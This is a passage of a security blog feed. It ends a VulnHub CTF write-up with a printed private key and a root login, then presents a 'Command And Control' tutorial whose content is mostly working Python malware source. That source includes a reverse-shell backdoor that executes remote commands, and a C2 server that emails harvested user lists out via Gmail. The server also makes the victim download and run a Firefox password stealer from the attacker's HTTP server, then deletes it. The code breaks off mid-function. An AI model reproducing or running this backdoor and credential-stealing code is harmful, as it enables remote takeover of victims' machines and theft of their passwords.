f/9kbxnOj1k4v42Ndgifvq7hICV3JBjK85l8bYeTX7qHcpLgR15TlJq/JC+ec7vI
o9MlpQKCAQAozkE6th6DrvJS7HefNRIQY8ueAqhOwQuREkuB5Q2BFLpG917cGF7l
lv0Hj6exig5zekivqmk6Sia6na93tsFSuAJJwyUCYJi1ebR+EcFrXaEukhgLaI9b
JqlBYJY6JuNTch24KNj0JB1m6drHL0PLrE4ko1iigHH7npj3vJ135HCMFmafRUYo
1jUF++/RzvCE1QEyHXBgBqsFybq7mYnroWxgiFNZ9S88wGHsDeP0/jaD7cqz6cTx
xBFG2NOZRNNWiihMSod74QJzuHUk+a6PFDHqgDEkkRU22z4ITWXrArdUsXCcJ44y
g4K0D7+4jBOETJEJFJv4rQCx/RlSbvF1AoIBAQCBpyqo2wEXzPvKLjqE4Ph7Cxy7
Z1nlGMp/mFRA5dOXH6CsZWELepVrhh6vlNa93Rq9yg7PLZH8pSv4E5CMmj6eBqLr
ZDcekqPPB31M7UNe8rS0xaBEVApAy0Dx0OiTDcqre+3g2ikIUx3ysStZmt01gTHp
0EgcDlzsmng+qPys8I7VtpUh/XDAKz5m/8b7mEQRQCmduKE7+yqGLKRwdJfq4cJ5
YPChhiv43zowPpuha/akN7Ydl+qi7toMQhvnayX5S2Vb9kl4Fl7JBV5KV16h4Lbw
SeSIdV0ITWhpxuG+K10LN69mYuTAZm6ihc0MM3v4nRtE3UpV74FCkQsTIfKC
-----END RSA PRIVATE KEY-----
[admin@votenow .ssh]$ 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[admin@votenow .ssh]$ ssh -i id_rsa root@localhost -p 2082
Last login: Wed Aug 14 17:39:34 2024 from 127.0.0.1
[root@votenow ~]# whoami
root
[root@votenow ~]# cat 
.bash_history        .config/             .ssh/
.bash_logout         .cshrc               .tcshrc
.bash_profile        .local/              .viminfo
.bashrc              .mysql_history       anaconda-ks.cfg
.cache/              .pki/                root-final-flag.txt
[root@votenow ~]# cat /root/
.bash_history        .config/             .ssh/
.bash_logout         .cshrc               .tcshrc
.bash_profile        .local/              .viminfo
.bashrc              .mysql_history       anaconda-ks.cfg
.cache/              .pki/                root-final-flag.txt
[root@votenow ~]# cat /root/root-final-flag.txt 
Congratulations on getting root.

 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

This CTF was created by bootlesshacker - https://security.caerdydd.wales

Please visit my blog and provide feedback - I will be glad to hear from you.
[root@votenow ~]# 
</code></pre></div></div>

<p>Finally we have finished compromising the machine.</p>

<p>Arc4he</p>]]></content><author><name>Arc4he</name><email>arc4.he@gmail.com</email></author><category term="vulnhub" /><category term="infosec" /><category term="hashcat" /><category term="phpmyadmin" /><category term="ssh" /><category term="mysql" /><category term="capabilities" /><summary type="html"><![CDATA[The Presidential Elections within the USA are just around the corner (November 2020). One of the political parties is concerned that the other political party is going to perform electoral fraud by hacking into the registration system, and falsifying the votes. The state of Ontario has therefore asked you (an independent penetration tester) to test the security of their server in order to alleviate any electoral fraud concerns. Your goal is to see if you can gain root access to the server – the state is still developing their registration website but has asked you to test their server security before the website and registration system are launched.]]></summary></entry><entry><title type="html">Command And Control</title><link href="http://localhost:4000/CommandAndControl/" rel="alternate" type="text/html" title="Command And Control" /><published>2024-08-12T00:00:00-06:00</published><updated>2024-08-12T00:00:00-06:00</updated><id>http://localhost:4000/CommandAndControl</id><content type="html" xml:base="http://localhost:4000/CommandAndControl/"><![CDATA[<p><img src="/assets/images/Command-And-Control/command-Control-1.png" alt="" /></p>

<h2 id="definition-and-objective">Definition and Objective</h2>

<p>A <strong>Command and Control (C&amp;C)</strong> is a software system designed to control a client from a server. It allows an operator to execute malware or other commands on remote machines. This document explains the basic implementation of a simple C&amp;C project.</p>

<h3 id="simple-cc-project">Simple C&amp;C Project</h3>

<p><strong>GitHub Link</strong>: <a href="https://github.com/Arc4he/Command-And-Control/">Simple C&amp;C Project</a></p>

<h3 id="simple-backdoor">Simple Backdoor</h3>

<p>In the GitHub project, there is a file called <code class="language-plaintext highlighter-rouge">backdoor.py</code> with the following code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">subprocess</span>   

<span class="k">def</span> <span class="nf">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">"cp850"</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="sa">f</span><span class="s">"Error executing command: </span><span class="si">{</span><span class="n">e</span><span class="p">.</span><span class="n">output</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'cp850'</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s">"</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="sa">f</span><span class="s">"Unexpected error: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s">"</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">client_socket</span><span class="p">:</span>
            <span class="n">client_socket</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"192.168.1.X"</span><span class="p">,</span> <span class="mi">443</span><span class="p">))</span> <span class="c1"># Your IP
</span>            
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="n">command</span> <span class="o">=</span> <span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
                <span class="k">if</span> <span class="ow">not</span> <span class="n">command</span><span class="p">:</span>
                    <span class="k">break</span>
                
                <span class="n">command_output</span> <span class="o">=</span> <span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
                <span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">command_output</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"cp850"</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">ConnectionRefusedError</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
</code></pre></div></div>

<h2 id="initial-program-flow">Initial Program Flow</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">client_socket</span><span class="p">:</span>
            <span class="n">client_socket</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"192.168.1.X"</span><span class="p">,</span> <span class="mi">443</span><span class="p">))</span> <span class="c1"># Your IP
</span>            
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="n">command</span> <span class="o">=</span> <span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
                <span class="k">if</span> <span class="ow">not</span> <span class="n">command</span><span class="p">:</span>
                    <span class="k">break</span>
                
                <span class="n">command_output</span> <span class="o">=</span> <span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
                <span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">command_output</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"cp850"</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">ConnectionRefusedError</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
</code></pre></div></div>

<p>In this code snippet we start the main flow of the program, and try to create a socket to connect to the server. Now we create a while loop to receive commands from the server constantly. When command is received, run_command function is called to execute and reeturn it. Finally we have exceptions in case there is a problem with the program, so that we can control the errors.</p>

<h2 id="function-run-command">Function Run command</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">"cp850"</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="sa">f</span><span class="s">"Error executing command: </span><span class="si">{</span><span class="n">e</span><span class="p">.</span><span class="n">output</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'cp850'</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s">"</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="sa">f</span><span class="s">"Unexpected error: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s">"</span>
</code></pre></div></div>

<p>The main purpose of the function is to execute the commands received from the server. To do this, I import the subprocess library to execute commands at the system level and return them to the server.</p>

<h2 id="cc">C&amp;C</h2>
<p>In the github project I have a file called <strong>command_and_control.py</strong> whit this code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">smtplib</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">tempfile</span>
<span class="kn">from</span> <span class="nn">email.mime.text</span> <span class="kn">import</span> <span class="n">MIMEText</span>
<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[!] Leaving the program...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>

<span class="c1"># root?
</span><span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] You need to be root</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Listener</span><span class="p">:</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">options</span> <span class="o">=</span> <span class="p">{</span><span class="s">"get users"</span><span class="p">:</span> <span class="s">"List system valid users (Gmail)"</span><span class="p">,</span> <span class="s">"help"</span><span class="p">:</span> <span class="s">"Show this help panel"</span><span class="p">,</span> <span class="s">"firefox"</span><span class="p">:</span> <span class="s">"Get firefox browser passwords"</span><span class="p">}</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">server_process</span> <span class="o">=</span> <span class="bp">None</span>

        <span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="n">server_socket</span><span class="p">.</span><span class="n">listen</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Listening for incoming connections...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>

        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">,</span> <span class="n">client_address</span> <span class="o">=</span> <span class="n">server_socket</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Connection established by </span><span class="si">{</span><span class="n">client_address</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">command_remotely</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">).</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'cp850'</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">send_email</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">sender</span><span class="p">,</span> <span class="n">recipients</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="n">subject</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">sender</span>
        <span class="n">msg</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="s">', '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">recipients</span><span class="p">)</span>

        <span class="k">with</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP_SSL</span><span class="p">(</span><span class="s">'smtp.gmail.com'</span><span class="p">,</span> <span class="mi">465</span><span class="p">)</span> <span class="k">as</span> <span class="n">smtp_server</span><span class="p">:</span>
            <span class="n">smtp_server</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
            <span class="n">smtp_server</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">recipients</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span>

        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Emails sent successfully!!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">get_user</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"net user"</span><span class="p">)</span>
        <span class="n">command_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">client_socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_email</span><span class="p">(</span><span class="s">"Net Users Report - C2"</span><span class="p">,</span> <span class="n">command_output</span><span class="p">,</span> <span class="s">"your@gmail.com"</span><span class="p">,</span> <span class="p">[</span><span class="s">"your@gmail.com"</span><span class="p">],</span> <span class="s">"jdad cnda uvda sawa"</span><span class="p">)</span> <span class="c1"># e-mail addres &amp;&amp; aplication key of yout e-mail addres
</span>
    <span class="k">def</span> <span class="nf">help_panel</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">donde</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="s">"cd"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">donde</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">options</span><span class="p">.</span><span class="n">items</span><span class="p">():</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s"> - </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">check_path</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">directory</span> <span class="o">=</span> <span class="n">tempfile</span><span class="p">.</span><span class="n">mkdtemp</span><span class="p">(</span><span class="n">prefix</span><span class="o">=</span><span class="s">"Python-Server-"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"Temporary directory '</span><span class="si">{</span><span class="n">directory</span><span class="si">}</span><span class="s">' created.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">))</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">file_to_copy</span> <span class="o">=</span> <span class="s">"decrypt_firefox.py"</span>
            <span class="n">current_directory</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">getcwd</span><span class="p">()</span>
            <span class="n">source_file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">current_directory</span><span class="p">,</span> <span class="n">file_to_copy</span><span class="p">)</span>
            <span class="n">destination_file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">directory</span><span class="p">,</span> <span class="n">file_to_copy</span><span class="p">)</span>
            <span class="n">shutil</span><span class="p">.</span><span class="n">copy</span><span class="p">(</span><span class="n">source_file_path</span><span class="p">,</span> <span class="n">destination_file_path</span><span class="p">)</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"Error al copiar el archivo: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">directory</span>

    <span class="k">def</span> <span class="nf">start_local_http_server</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">directory</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">server_process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"python3"</span><span class="p">,</span> <span class="s">"-m"</span><span class="p">,</span> <span class="s">"http.server"</span><span class="p">,</span> <span class="s">"80"</span><span class="p">,</span> <span class="s">"-d"</span><span class="p">,</span> <span class="n">directory</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"[+] HTTP Server started successfully"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Error, you need to check if you have any services on port 80: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">stop_local_http_server</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">server_process</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">server_process</span><span class="p">.</span><span class="n">terminate</span><span class="p">()</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"[+] HTTP Server stopped successfully"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">get_firefox_passwords</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">directory</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">check_path</span><span class="p">()</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">start_local_http_server</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">win_user</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="s">"whoami"</span><span class="p">)</span>
            <span class="n">win_user_str</span> <span class="o">=</span> <span class="n">win_user</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
            <span class="n">release</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="sa">f</span><span class="s">'dir /s /b /ad "C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="si">{</span><span class="n">win_user_str</span><span class="si">}</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">Roaming</span><span class="se">\\</span><span class="s">Mozilla</span><span class="se">\\</span><span class="s">Firefox</span><span class="se">\\</span><span class="s">Profiles</span><span class="se">\\</span><span class="s">*release*"'</span><span class="p">)</span>
            <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"cd C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="si">{</span><span class="n">win_user_str</span><span class="si">}</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">Local</span><span class="se">\\</span><span class="s">Temp &amp;&amp; curl http://</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">ip</span><span class="si">}</span><span class="s">/decrypt_firefox.py -o decrypt_firefox.py &amp;&amp; python decrypt_firefox.py </span><span class="si">{</span><span class="n">release</span><span class="si">}</span><span class="s">"</span>
            <span class="n">command_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">Sent command: </span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">))</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">command_output</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

            <span class="k">try</span><span class="p">:</span>
                <span class="c1"># Cleaning
</span>                <span class="n">pwd</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"del C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="si">{</span><span class="n">win_user_str</span><span class="si">}</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">Local</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">decrypt_firefox.py"</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">command_remotely</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>
                <span class="n">shutil</span><span class="p">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">stop_local_http_server</span><span class="p">()</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"[!] it has not been possible to delete the file 'decrypt_firefox.py' if you run 'firefox' again it will not be possible."</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>
                <span class="k">pass</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"[!] Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>
            <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"get users"</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">get_user</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s">"firefox"</span><span class="p">:</span>
